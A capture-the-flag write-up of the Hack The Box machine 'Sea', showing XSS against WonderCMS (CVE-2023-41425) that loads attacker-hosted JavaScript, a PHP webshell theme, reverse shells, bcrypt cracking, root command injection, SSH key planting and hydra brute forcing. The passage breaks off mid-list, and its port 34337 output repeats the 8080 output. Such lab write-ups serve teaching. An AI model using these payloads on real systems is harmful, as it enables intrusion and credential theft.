---
title: HTB: Sea
url: https://0xdf.gitlab.io/2024/12/21/htb-sea.html
date: 2024-12-21T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-sea, hackthebox, ctf, nmap, feroxbuster, wondercms, cve-2023-41425, xss, plugin, hashcat, file-read, command-injection, hydra
---

![Sea](/img/sea-cover.png)

Sea starts with the exploitation of WonderCMS. I’ll find a POC, but work through the steps manually to better show them and learn from them. WonderCMS stores data in files, and I’ll find a password hash in a file and crack it to move to the next user. That same password grants access to an internal website where I’ll find a command injection to get root. In Beyond Root, I’ll show an alternative path involving bruteforcing the WonderCMS admin password.

## Box Info

| Name | [Sea](https://hackthebox.com/machines/sea)  [Sea](https://hackthebox.com/machines/sea) [Play on HackTheBox](https://hackthebox.com/machines/sea) |
| --- | --- |
| Release Date | [10 Aug 2024](https://twitter.com/hackthebox_eu/status/1821577122634191047) |
| Retire Date | 21 Dec 2024 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Sea |
| Radar Graph | Radar chart for Sea |
| First Blood User | 00:18:53[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 00:33:42[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [FisMatHack FisMatHack](https://app.hackthebox.com/users/1076236) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.28
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-11 08:34 EDT
Nmap scan report for 10.10.11.28
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.28
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-11 08:35 EDT
Nmap scan report for 10.10.11.28
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal. There’s a message that the `httponly` flag is not set on `PHPSESSID`, which both represents a vulnerability should there be a cross-site scripting (XSS) vulnerability, and suggests the site is running on PHP.

### Website - TCP 80

#### Site

The site is about biking adventures and competitions:

![image-20240811084101062](/img/image-20240811084101062.png)

The “How To Participate” link leads to `/how-to-participate`:

![image-20240811084418965](/img/image-20240811084418965.png)

Nothing too interesting on that page, other than a link to “contact”, which leads to `sea.htb/contact.php`.

I’ll add `sea.htb` to my `/etc/hosts` file:

```
10.10.11.28 sea.htb

```

I’ll also do a quick `ffuf` run to fuzz subdomains that respond differently, but not find any.

Now able to resolve the site, the contact form loads:

![image-20240811085204034](/img/image-20240811085204034.png)

On submitting the form, it shows it was submitted:

![image-20240811085509162](/img/image-20240811085509162.png)

#### Tech Stack

The `nmap` scan showed the `PHPSESSID` cookie, which is set in the initial response header:

```

HTTP/1.0 200 OK
Date: Sun, 11 Aug 2024 12:39:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=1cvtlil3q6a71emiof85iggeta; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3670
Connection: close
Content-Type: text/html; charset=UTF-8

```

There’s also the `contact.php` page. So it’s safe to say the site is written in PHP.

The 404 page just shows the same template with a 404 message:

![image-20240811085738216](/img/image-20240811085738216.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://sea.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://sea.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       84l      209w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      230c http://sea.htb/themes => http://sea.htb/themes/
301      GET        7l       20w      231c http://sea.htb/plugins => http://sea.htb/plugins/
200      GET      118l      226w     2731c http://sea.htb/contact.php
301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb/data/
301      GET        7l       20w      234c http://sea.htb/data/files => http://sea.htb/data/files/
301      GET        7l       20w      232c http://sea.htb/messages => http://sea.htb/messages/
301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
500      GET        9l       15w      227c http://sea.htb/themes/bike/theme.php
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
404      GET        0l        0w     3341c http://sea.htb/messages/_ablage
404      GET        0l        0w     3341c http://sea.htb/themes/bike/wrap.php
[####################] - 7m    210000/210000  0s      found:13      errors:7426
[####################] - 6m     30000/30000   80/s    http://sea.htb/ 
[####################] - 6m     30000/30000   79/s    http://sea.htb/themes/ 
[####################] - 6m     30000/30000   77/s    http://sea.htb/plugins/ 
[####################] - 7m     30000/30000   75/s    http://sea.htb/data/ 
[####################] - 7m     30000/30000   75/s    http://sea.htb/data/files/ 
[####################] - 7m     30000/30000   75/s    http://sea.htb/messages/ 
[####################] - 6m     30000/30000   79/s    http://sea.htb/themes/bike/ 

```

There are several interesting paths to explore.

Each of the directories that return 301 redirect to the same path with a `/` on the end, and that returns 403 forbidden. This could be a permissions thing, or just that Apache is configured to not allow access to these directories, only the files in them.

#### Theme Identification

The `theme/bike` directory has some files worth checking out. I stared down this road thinking it would be cool to identify the exact theme, but it turns out to be a necessary step to exploiting the intended path on the box.

`theme.php` returns an empty page when visited directly. That makes sense, as it’s likely meant to be included in the main pages.

`version` return “3.2.0”. `LICENSE` shows the theme uses the MIT license:

![image-20240811110108794](/img/image-20240811110108794.png)

“turboblack” is a good keyword to note.

`summary` contains the text “Animated bike theme, providing more interaction to your visitors.”

Searching around, there’s a reference to WonderCMS:

![image-20240811111302822](/img/image-20240811111302822.png)

A bit more searching finds the theme on GitHub at <https://github.com/robiso/bike>:

![image-20240811111510378](/img/image-20240811111510378.png)

The `README.md` file is also on Sea:

![image-20240811111612709](/img/image-20240811111612709.png)

So the site is running on [WonderCMS](https://www.wondercms.com/).

## Shell as www-data

### Contact Form Fails

#### XSS

Given the contact form, it makes sense to check it for XSS. Because I don’t get to see what comes back from the form submission, it would be a blind XSS. I’ll try something like this:

![image-20240811091317528](/img/image-20240811091317528.png)

The site complains that the email is not a valid email (client-side validation), but I can send it via Burp Repeater and it works fine:

![image-20240811105531913](/img/image-20240811105531913.png)

I’m using a slightly different URL for each HTML injection attempt so I can easily track which trigger. I’ll have a Python webserver listening, but no contacts.

#### SSRF

Another thing to check for is a server-side request forgery (SSRF), or if there’s a user clicking on the link sent in the “Website” field.

I’ll try sending my IP as the website:

![image-20240811105836920](/img/image-20240811105836920.png)

There’s no contact at my Python webserver.

### CVE-2023-41425

#### Identify

I don’t have a WonderCMS version to go with, so I’ll look for vulnerabilities in general, with an idea that this box was released on August 2024, so focusing on CVEs from 2023 and 2024.

There’s a bunch of results that come back, but on the first page, the one that jumps out is CVE-2023-41425:

![image-20240811112537449](/img/image-20240811112537449.png)

This one sticks out because it:
- offers remote code execution;
- is unauthenticated;
- is recent.

This POC has a Python script that will exploit the vulnerability, but I will do it manually to understand it better. It’s also a very difficult to use POC.

#### Login URL

To use this exploit, I need to know the login URL for WonderCMS. There are a lot of ways to figure this out. Forum posts like [this one](https://www.wondercms.com/community/viewtopic.php?t=1053) makes reference to `/loginURL`:

![image-20240811125205579](/img/image-20240811125205579.png)

That same relative path is in the exploit POC screenshot:

![image-20240811125253481](/img/image-20240811125253481.png)

It’s in a different format (`/loginURL` vs `/index.php?page=loginURL`), but that’s a common PHP page structure.

If I download the WonderCMS source there’s only a simple `index.php` file. In it, there’s a `createDb` function that defines the `login` page:

![image-20240811125542073](/img/image-20240811125542073.png)

Other places, it seems hard coded into the PHP:

![image-20240811125624638](/img/image-20240811125624638.png)

When I visit `/loginURL` (or `/index.php?page=loginURL`), it loads the template with the login form in the content page:

![image-20240811125708006](/img/image-20240811125708006.png)

#### XSS POC

To show this works, I’m going to send a URL that looks like this:

```

http://sea.htb/index.php?page=loginURL"></form><script src="http://10.10.14.6/0xdf.js"></script><form action="

```

The idea is that it gets put into a `form`, which the payload then closes, creates a `script` tag loading JavaScript from my host, and then starts a new form so that all the HTML is valid.

I’ll submit this in the contact form:

![image-20240811133859527](/img/image-20240811133859527.png)

In about a minute, there’s a connection at my Python webserver:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.28 - - [11/Aug/2024 13:40:49] code 404, message File not found
10.10.11.28 - - [11/Aug/2024 13:40:49] "GET /0xdf.js HTTP/1.1" 404 -

```

That’s successful XSS.

#### Malicious Theme

The [theme file from the POC](https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip) is very simple:

```

oxdf@hacky$ unzip -l main.zip 
Archive:  main.zip
1f1a52393d8a6ff6c27e56d958c6d0ee45e7a37f
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2023-08-02 12:44   revshell-main/
     5736  2023-08-02 12:44   revshell-main/rev.php
---------                     -------
     5736                     2 files

```

I’ll make my own. It’s just a simple PHP webshell in a theme name directory in a zip archive:

```

oxdf@hacky$ cat theme223/cmd.php
<?php system($_REQUEST['cmd']); ?>
oxdf@hacky$ zip -r theme223.zip theme223/
  adding: theme223/ (stored 0%)
  adding: theme223/cmd.php (stored 0%)
oxdf@hacky$ unzip -l theme223.zip 
Archive:  theme223.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-08-11 13:52   theme223/
       35  2024-08-11 13:52   theme223/cmd.php
---------                     -------
       35                     2 files

```

#### XSS Payload

As I can inject a script tag, the attack is to abuse this XSS as the logged in user, and use that to install a malicious theme. The POC is a bit complicated for me. It’s doing a lot, when really only one request is needed. The JS will:
- Get a token value from the current page.
- Make a request to install a theme from a remote host (my VM).

That JavaScript will look like:

```

var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "/?installModule=http://10.10.14.6/theme223.zip&directoryName=violet&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", urlRev);
xhr.send();

```

I’ll save this as `0xdf.js`, and when Sea next requests it (it doesn’t seem to clean up on failed gets), the Python webserver returns the JS, and then there are four requests for the theme:

```
10.10.11.28 - - [11/Aug/2024 13:56:52] "GET /0xdf.js HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -

```

I’ll find the unpacked webshell at `/themes/theme223/cmd.php`, and it works to get code execution:

```

oxdf@hacky$ curl http://sea.htb/themes/theme223/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

To get a shell, I’ll replace `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). I’ll write it out in the Firefox address bar, as it will take care of URL-encoding bits for me. I will need to use `%26` instead of `&` so that it doesn’t think it’s the separator for a new parameter:

![image-20240811140414115](/img/image-20240811140414115.png)

On submitting, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.28 40808
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sea:/var/www/sea/themes/theme223$ 

```

I’ll upgrade with the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@sea:/var/www/sea/themes/theme223$ script /dev/null -c bash
Script started, file is /dev/null
www-data@sea:/var/www/sea/themes/theme223$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@sea:/var/www/sea/themes/theme223$

```

## Shell as amay

### Enumeration

#### Users

There are two users with home directories in `/home`:

```

www-data@sea:/home$ ls
amay  geo

```

Those same two users and root have shells set on the box:

```

www-data@sea:/home$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash

```

www-data is not able to read from geo’s home directory. They can list files in amay’s:

```

www-data@sea:/home$ find . -type f  
find: './geo': Permission denied
find: './amay/.ssh': Permission denied
find: './amay/.cache': Permission denied
./amay/.profile
./amay/.bashrc
./amay/.bash_logout
./amay/user.txt

```

www-data is not able to read anything interesting.

#### Website

The root of the website is located in `/var/www/sea`:

```

www-data@sea:/var/www/sea$ ls
contact.php  data  index.php  messages  plugins  themes

```

`contact.php` contains all the HTML for the contact form, as well as this PHP that handles the POST request:

```

 <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") { 
        $name = $_POST["name"];
        $email = $_POST["email"];
        $age = $_POST["age"];
        $country = $_POST["country"];
        $website = $_POST["website"];
        $message = "";                               
        $content = "Name: $name\nEmail: $email\nAge: $age\nCountry: $country\nWebsite: $website\n";

        $file_path = "/var/www/sea/messages/" . date("Y-m-d") . ".txt";

        if (file_put_contents($file_path, $content, FILE_APPEND) !== false) {
            $message = "<p style='color: green;'>Form submitted successfully!</p>";
        } else {
            $message = "<p style='color: red;'>Failed to submit form. Please try again later.</p>";
        }
    }
    ?>

```

Basically it appends to the with with today’s date in `/var/www/sea/messages`. It’s empty, but if I send my exploit again, it is in there (the bot cleans it up after seeing it):

```

www-data@sea:/var/www/sea/messages$ cat 2024-08-11.txt
Name: 0xdf
Email: 0xdf@sea.htb
Age: 100
Country: usa
Website: http://sea.htb/index.php?page=loginURL"></form><script src="http://10.10.14.6/0xdf.js"></script><form action="

```

In `data`, there’s a `database.js` file:

```

www-data@sea:/var/www/sea/data$ ls
cache.json  database.js  files

```

WonderCMS is proudly a file-based system, with no more complicated DB. `database.js` has the info for the site in a JSON format:

```

{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/11 18:30:58": "127.0.0.1",
            "2024\/08\/11 18:30:28": "127.0.0.1",
            "2024\/08\/11 18:28:58": "127.0.0.1",
            "2024\/08\/11 18:28:27": "127.0.0.1",
            "2024\/08\/11 18:26:57": "127.0.0.1"
        },
        "lastModulesSync": "2024\/08\/11",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}

```

The `password` field jumps out as interesting.

#### Network

There are two services listening only on localhost, TCP 8080 and 34337:

```

amay@sea:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:34337         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

8080 is a webserver that requires HTTP basic auth to access, as shown by the 401 response and the `WWW-Authenticate` header:

```

amay@sea:~$ curl -v localhost:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Host: localhost:8080
< Date: Sun, 11 Aug 2024 19:25:14 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.23
< WWW-Authenticate: Basic realm="Restricted Area"
< Content-type: text/html; charset=UTF-8
< 
* Closing connection 0
Unauthorized access

```

The 34337 port also speaks HTTP:

```

amay@sea:~$ curl -v localhost:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Host: localhost:8080
< Date: Sun, 11 Aug 2024 19:25:14 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.23
< WWW-Authenticate: Basic realm="Restricted Area"
< Content-type: text/html; charset=UTF-8
< 
* Closing connection 0
Unauthorized access

```

This turns out to be related to the headless Chrome instance that is being exploited by the XSS above.

### Crack Hash

I’ll take the hash from the database and save it in a file. There are two `\` that are escaping `/` that I’ll need to remove:

```

oxdf@hacky$ cat hash 
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q

```

I’ll pass that to `hashcat`, which identifies is as one of four possible hash format:

```

$ hashcat hash rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

3200 is the standard bcrypt hash, which is the most common, so I’ll start there:

```

$ hashcat hash rockyou.txt -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
...[snip]...

```

The password is “mychemicalromance”.

### Identify User

A quick way to check this password against users on the box is with `netexec` (though if they all fail, it’s worth trying again with `su` as it’s possible that the password is good but the login fails for some other reason).

```

oxdf@hacky$ netexec ssh sea.htb -u users -p mychemicalromance --continue-on-success
SSH         10.10.11.28     22     sea.htb          [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.10.11.28     22     sea.htb          [-] geo:mychemicalromance Authentication failed.
SSH         10.10.11.28     22     sea.htb          [+] amay:mychemicalromance  (non root) Linux - Shell access!
SSH         10.10.11.28     22     sea.htb          [-] root:mychemicalromance Authentication failed.

```

The password works for amay.

### su / SSH

The password works with `su`:

```

www-data@sea:/$ su - amay
Password: 
amay@sea:~$

```

It also works over SSH:

```

oxdf@hacky$ sshpass -p mychemicalromance ssh amay@sea.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
...[snip]...
amay@sea:~$ 

```

And I can grab `user.txt`:

```

amay@sea:~$ cat user.txt
cd47aa3f************************

```

## Shell as root

### Enumeration

#### Tunnel

I’ll reconnect my SSH session with the `-L 8000:localhost:8080` option to tunnel so that my VM localhost listens on 8000 and forwards that through the SSH session to 8080 on Sea. I’m using 8000 because Burp is already listening on my host on 8080.

Visiting `http://localhost:8000` pops the HTTP basic auth prompt:

![image-20240811153148903](/img/image-20240811153148903.png)

#### Access

The creds for amay, “mychemicalromance”, work here as well:

![image-20240811153239701](/img/image-20240811153239701.png)

#### Functionality

Each of the buttons leads to a POST request to `/` with a POST body that includes the button name. For example, clicking “Clean system with apt” sends this (with some extra headers cleaned up for display):

```

POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://localhost:8000
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Referer: http://localhost:8000/

clean_apt=

```

There’s nothing displayed back when the “System Management” buttons are pushed. “Update system” just crashes the page with no reply. The others return nothing. The four POST parameters are `clean_apt`, `update_system`, `clear_auth_log`, and `clear_access_log`.

The “Analyze” button sends a `log_file` parameter along with the button name, `analyze_log`:

```

POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8000
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Referer: http://localhost:8000/

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=

```

Analyzing the log access log (before clearing it) shows some of the suspicious request involved in getting a foothold on Sea:

![image-20240811154205934](/img/image-20240811154205934.png)

Given the files and commands necessary to perform these actions, it seems very likely that the server is running as root.

#### Tech Stack

The HTTP response headers on this internal service show it is also PHP:

```

HTTP/1.1 200 OK
Host: localhost:8000
Date: Sun, 11 Aug 2024 19:31:57 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
Content-type: text/html; charset=UTF-8

```

The page loads as `/index.php` as well.

### File Read (Sort Of)

I’ll notice in the log file read it’s left to the user to specify what file to request. While there are only two in the dropdown menu:

![image-20240811154447778](/img/image-20240811154447778.png)

There’s nothing to stop an attacker from changing that request. I’ll send one of these requests to Burp Repeater and edit the parameter to point to `/etc/passwd`:

![image-20240811154553991](/img/image-20240811154553991.png)

It works to some degree, but only select lines from `/etc/passwd` are returned. I can try to read the flag:

![image-20240811154636813](/img/image-20240811154636813.png)

Nothing interesting there. Same for `/root/.ssh/id_rsa`.

### Command Injection

#### POC

It’s possible that the code is using the system to get the contents of the file with tools like `cat` and `grep`. While it’s a bit silly for PHP to read a file with `cat`, sometimes a lazy dev will use `grep` for easy pattern matching.

If that is the case, I’ll try to inject into that by adding a `;` and then another command. A very safe command to inject is a sleep, as all I need is response timing to see if it worked. I’ll try that. When I sleep for 0, it returns in ~200 millis:

![image-20240811155311417](/img/image-20240811155311417.png)

Changing the 0 to 2 results in ~2200 millis:

![image-20240811155335483](/img/image-20240811155335483.png)

That’s command injection.

#### Output

If I change `sleep 2` to `id` while requesting the `id_rsa` file, it doesn’t return any results:

![image-20240811155458773](/img/image-20240811155458773.png)

Some tweaking around with the injection will show output. In this case, I’ll adding “ #” after the command, so that anything else on the line is commented out:

![image-20240811155826000](/img/image-20240811155826000.png)

Not only did that work, but it’s running as roo.

#### Reverse Shell Fails

I’ll update my payload to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20240811160355825](/img/image-20240811160355825.png)

On sending, I get a shell at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.28 33466
bash: cannot set terminal process group (10160): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring# 

```

However, a few seconds after connecting, it types `exit` into the shell and exits:

```

root@sea:~/monitoring# exit
oxdf@hacky$ 

```

I played with a few things like running in the background and `nohup`, but wasn’t able to get a better shell.

#### SSH

There is a `.ssh` directory in `/root`:

![image-20240811161540747](/img/image-20240811161540747.png)

It only has an `authorized_keys` file, no keys:

![image-20240811161609472](/img/image-20240811161609472.png)

I’ll create an SSH key pair and host the public key on a Python webserver. Then I’ll fetch it and add it to `authorized_keys`:

![image-20240811161811016](/img/image-20240811161811016.png)

Now I can connect over SSH using that key as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@sea.htb 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
...[snip]...
root@sea:~#

```

And read `root.txt`:

```

root@sea:~# cat root.txt
5560f2ef************************

```

## Beyond Root - Unintended Path

### Overview

There is an unintended path that allows for skipping directly to amay as a foothold. In context with the intended path, it looks like this:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    
    A[Enumeration]-->B(<a href='#theme-identification'>Identify WonderCMS</a>);
    B-->C(<a href='#cve-2023-41425'>CVE-2023-41425</a>);
    C-->|Via XSS|D(<a href='#xss-poc'>Upload Theme</a>);
    D-->E[<a href='#shell'>Shell as www-data</a>];
    E-->F(<a href='#crack-hash'>Crack Password</a>);
    F-->G[<a href='#su--ssh'>SSH as amay</a>];
    B-->H(<a href='#brute-force-admin'>Bruteforce WonderCMS Password</a>);
    H-.->|Username\nunknown|G;
    H-->I[<a href='#upload-theme'>WonderCMS Admin Access];
    I-->|Via Admin|D;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,8,9,10,11 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

The password to the WonderCMS admin panel is brute force-able, which means I can brute force it directly and get access. That password is also the amay user’s password, but I don’t have that username at this point. If I could get the username, I could skip WonderCMS entirely after getting the password.

### Brute Force Admin

#### Admin Login Form

I noted [above](#login-url) that `/loginURL` presents a form that just takes a password:

![image-20240812144913408](/img/image-20240812144913408.png)

Submitting generates a POST request like this:

```

POST /loginURL HTTP/1.1
Host: sea.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://sea.htb
Connection: close
Referer: http://sea.htb/loginURL
Cookie: PHPSESSID=nh31i681gr3f4ed2h048899m0k

password=test

```

On the site, there’s a popup showing it failed:

![image-20240812145221983](/img/image-20240812145221983.png)

#### Brute Force

Web form brute force will never been the intended path on a modern HTB machine, but sometimes it does present an unintended path, as in this case. I’ll use [hydra](https://github.com/vanhauser-thc/thc-hydra) to do the brute force with the following parameters:
- `-l ''` - The POST does not take a username, but `hydra` requires on be given, so I like to give an empty string (though anything will work).
- `-P rockyou.txt` - The wordlist of passwords to try, in this case `rockyou.txt`.
- `sea.htb` - The target server.
- `http-post-form` - The module to use for brute forcing, in this case an HTTP form.
